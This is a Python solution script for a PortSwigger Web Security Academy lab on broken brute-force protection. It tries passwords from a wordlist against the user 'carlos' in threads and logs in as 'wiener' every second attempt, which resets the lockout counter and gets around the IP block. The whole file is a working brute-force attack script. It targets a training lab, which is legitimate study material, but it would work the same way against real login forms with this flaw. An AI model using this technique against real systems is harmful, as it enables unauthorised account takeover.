#!/usr/bin/env python3

#this script is built to solve
#https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    carlosLoginData = {
        'username': 'carlos',
        'password': password
    }

    loginRequestText = requests.post(url, cookies=cookie, data=carlosLoginData).text

    if 'Incorrect password' not in loginRequestText:
        print(f'[+] Found password: {password}')

def loginRequest(url, cookie):
    wienerLoginData = {
        'username': 'wiener',
        'password': 'peter'
    }

    requests.post(url, cookies=cookie, data=wienerLoginData)

def main():
    url = 'https://lkjljkljkl.web-security-academy.net/login'
    cookie = {'session': 'ùlkjkljmlkjjk'}

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    counter = 0

    for password in listPassword:
        counter += 1

        if counter == 2:
            counter = 0
            loginRequest(url, cookie)

        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.2)





if __name__ == '__main__':
    main()